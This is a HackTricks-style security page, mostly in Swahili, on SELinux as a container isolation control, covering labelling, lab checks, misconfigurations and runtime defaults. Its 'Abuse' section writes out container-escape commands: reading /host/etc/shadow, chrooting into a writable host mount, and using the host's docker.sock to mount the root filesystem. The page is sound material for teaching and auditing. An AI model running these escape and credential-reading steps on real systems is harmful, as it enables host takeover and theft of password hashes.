# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## Muhtasari

SELinux ni **mfumo wa Udhibiti wa Upatikanaji wa Lazima unaotegemea lebo**. Kila mchakato na kitu kinachohusika kinaweza kubeba muktadha wa usalama, na sera huamua ni domain gani zinaweza kuingiliana na aina gani na kwa namna gani. Katika mazingira yenye container, hii kawaida ina maana kwamba runtime inaanzisha mchakato wa container chini ya domain iliyofungwa ya container na kuweka lebo kwenye yaliyomo ndani ya container kwa aina zinazofanana. Ikiwa sera inafanya kazi ipasavyo, mchakato unaweza kusoma na kuandika vitu ambavyo lebo yake inatarajiwa kugusa wakati ukikatizwa ufikivu kwa yaliyomo mengine kwenye host, hata kama yale yaliyomo yanakuwa yanaonekana kupitia mount.

Hii ni mojawapo ya ulinzi wenye nguvu upande wa host unaopatikana katika utekelezaji wa container wa Linux mashuhuri. Ni muhimu hasa kwenye Fedora, RHEL, CentOS Stream, OpenShift, na mazingira mengine yanayolenga SELinux. Katika mazingira hayo, mwakilishi ambaye anapuuzia SELinux mara nyingi atasahau kwa nini njia inayofanana na wazi ya kuathiri host kwa kweli imezuiwa.

## AppArmor dhidi ya SELinux

Tofauti rahisi ya kiwango cha juu ni kwamba AppArmor ni ya kuzingatia path wakati SELinux ni **inayotegemea lebo**. Hiyo ina matokeo makubwa kwa usalama wa container. Sera inayotekelezwa kwa njia ya path inaweza kutenda tofauti ikiwa yaliyomo yale yale ya host yanapatikana chini ya path tofauti isiyotarajiwa. Sera inayotegemea lebo badala yake inauliza ni lebo gani ya kitu na domain ya mchakato inaweza kumfanyia nini. Hii haifanyi SELinux iwe rahisi, lakini inafanya iwe imara dhidi ya aina ya udanganyifu wa path ambayo watetezi mara nyingi huhangaishwa nayo katika mifumo inayotegemea AppArmor.

Kwa kuwa mfano ni wa kutegemea lebo, namna ya kushughulikia volume za container na maamuzi ya kurelabel ni muhimu kwa usalama. Ikiwa runtime au msimamizi anabadilisha lebo kwa upana sana ili "make mounts work", mpaka wa sera uliokusudiwa kuzuia mzigo wa kazi unaweza kuwa dhaifu zaidi kuliko ilivyokusudiwa.

## Maabara

Ili kuona ikiwa SELinux inafanya kazi kwenye mwenyeji:
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
Kuchunguza lebo zilizopo kwenye mwenyeji:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
Ili kulinganisha utekelezaji wa kawaida na ule ambapo uwekaji lebo umezimwa:
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
On an SELinux-enabled host, hii ni demonstration ya vitendo kwa sababu inaonyesha tofauti kati ya workload inayotekelezwa chini ya expected container domain na ile ambayo imeondolewa safu hiyo ya enforcement layer.

## Runtime Usage

Podman imepangwa vizuri zaidi na SELinux kwenye systems ambapo SELinux ni sehemu ya platform default. Rootless Podman pamoja na SELinux ni mojawapo ya misingi imara ya container kwa matumizi ya kawaida kwa sababu mchakato tayari haufungiwi haki za root upande wa host na bado umefungwa na MAC policy. Docker pia inaweza kutumia SELinux pale inapo supported, ingawa administrators wakati mwingine huizima ili kuepuka friction ya volume-labeling. CRI-O na OpenShift wanategemea sana SELinux kama sehemu ya hadithi yao ya container isolation. Kubernetes pia inaweza kuonyesha mipangilio inayohusiana na SELinux, lakini thamani yake inategemea ikiwa node OS kweli inaunga mkono na kutekeleza SELinux.

Somo linalorudiwa ni kwamba SELinux sio garnish ya hiari. Katika ecosystems zilizojengwa kuzunguka SELinux, ni sehemu ya expected security boundary.

## Misconfigurations

Kosa la jadi ni `label=disable`. Kwa uendeshaji, mara nyingi hii hutokea kwa sababu volume mount ilikanushwa na jibu la muda mfupi la haraka lilikuwa kuondoa SELinux badala ya kurekebisha modeli ya labeling. Kosa lingine la kawaida ni relabeling isiyo sahihi ya maudhui ya host. Operesheni pana za relabel zinaweza kufanya application ifanye kazi, lakini pia zinaweza kupanua kile container inaruhusiwa kugusa zaidi ya kilichokusudiwa awali.

Ni muhimu pia kutochanganya **imewekwa** SELinux na **inayotumika** SELinux. Host inaweza kuunga SELinux na bado kuwa katika permissive mode, au runtime inaweza isiweke workload chini ya domain inayotarajiwa. Katika hali hizo ulinzi ni dhaifu zaidi kuliko maelezo yanavyoweza kupendekeza.

## Abuse

Wakati SELinux haipo, iko permissive, au imezima kwa kiasi kikubwa kwa workload, njia zilizo mounted kwenye host zinakuwa rahisi zaidi kwa matumizi mabaya. Hiyo bind mount ambayo vingine ingekuwa imezuiliwa na labels inaweza kuwa njia ya moja kwa moja ya kupata data za host au kufanya mabadiliko kwenye host. Hii ni muhimu hasa ikiwa imechanganywa na writable volume mounts, container runtime directories, au shortcuts za uendeshaji ambazo zilifunua sensitive host paths kwa urahisi.

SELinux mara nyingi inaelezea kwa nini generic breakout writeup inafanya kazi mara moja kwenye host moja lakini inashindwa mara kwa mara kwenye nyingine ingawa runtime flags zinaonekana sawa. Kiambato kilichokosekana mara nyingi si namespace au capability kabisa, bali label boundary ambayo ilibaki intact.

The fastest practical check is to compare the active context and then probe mounted host paths or runtime directories that would normally be label-confined:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
Ikiwa host bind mount ipo na SELinux labeling imezimwa au kudhoofishwa, uvujaji wa taarifa mara nyingi hutokea kwanza:
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
Ikiwa mount inaweza kuandikwa na container kwa ufanisi ni host-root kutoka mtazamo wa kernel, hatua inayofuata ni kujaribu mabadiliko ya host yaliyo chini ya udhibiti badala ya kubahatisha:
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
Kwenye SELinux-capable hosts, kupoteza lebo karibu na direktori za hali ya runtime pia kunaweza kufichua njia za moja kwa moja za privilege-escalation:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
Amri hizi hazibadilishi full escape chain, lakini zinaonyesha haraka kama SELinux ndiyo iliyokuwa ikizuia upatikanaji wa data za host au uhariri wa faili upande wa host.

### Mfano Kamili: SELinux Imezimwa + Mount ya Host Inayoweza Kuandikwa

Ikiwa SELinux labeling imezimwa na filesystem ya host imewekwa writable katika `/host`, full host escape inageuka kuwa kesi ya kawaida ya bind-mount abuse:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Ikiwa `chroot` inafanikiwa, mchakato wa container sasa unafanya kazi kutoka kwenye host filesystem:
```bash
id
hostname
cat /etc/passwd | tail
```
### Mfano Kamili: SELinux Disabled + Runtime Directory

Ikiwa workload inaweza kufikia runtime socket mara labels zitakapozimwa, escape inaweza kuhamishwa kwa runtime:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
Taarifa muhimu ni kwamba SELinux mara nyingi ilikuwa udhibiti uliokuwa ukizuia hasa aina hii ya host-path au runtime-state access.

## Checks

Lengo la ukaguzi wa SELinux ni kuthibitisha kwamba SELinux imewezeshwa, kubaini muktadha wa usalama wa sasa, na kuona ikiwa faili au njia unazozijali kwa kweli zimetengwa kwa lebo.
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
What is interesting here:

- `getenforce` should ideally return `Enforcing`; `Permissive` or `Disabled` changes the meaning of the whole SELinux section.
- Ikiwa muktadha wa mchakato uliopo unaonekana usiotarajiwa au pana sana, workload huenda isifanye kazi chini ya sera ya container iliyokusudiwa.
- Ikiwa faili zilizowekwa kwenye host au saraka za runtime zina labels ambazo mchakato unaweza kuzifikia kwa uhuru mwingi, bind mounts zinakuwa hatari zaidi.

Unapokagua container kwenye jukwaa lenye uwezo wa SELinux, usichukulie uwekaji wa lebo kama jambo la pili. Katika kesi nyingi ni mojawapo ya sababu kuu kwanini host haijaathiriwa.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Inategemea host | SELinux separation is available on SELinux-enabled hosts, but the exact behavior depends on host/daemon configuration | `--security-opt label=disable`, kurelabel kwa upana kwa bind mounts, `--privileged` |
| Podman | Kwa kawaida imewezeshwa kwenye host zenye SELinux | Kutengwa kwa SELinux ni sehemu ya kawaida ya Podman kwenye mifumo yenye SELinux isipokuwa ikizimwa | `--security-opt label=disable`, `label=false` katika `containers.conf`, `--privileged` |
| Kubernetes | Hauwekwi moja kwa moja kwa kawaida kwenye ngazi ya Pod | SELinux support exists, but Pods usually need `securityContext.seLinuxOptions` or platform-specific defaults; runtime and node support are required | `seLinuxOptions` dhaifu au pana, kukimbia kwenye node zilizo permissive/disabled, sera za jukwaa zinazozima uwekaji wa lebo |
| CRI-O / OpenShift style deployments | Mara nyingi hutegemewa sana | SELinux is often a core part of the node isolation model in these environments | sera za kawaida zinazopanua sana upatikanaji, kuzima uwekaji wa lebo kwa ajili ya compatibility |

SELinux defaults are more distribution-dependent than seccomp defaults. On Fedora/RHEL/OpenShift-style systems, SELinux is often central to the isolation model. On non-SELinux systems, it is simply absent.
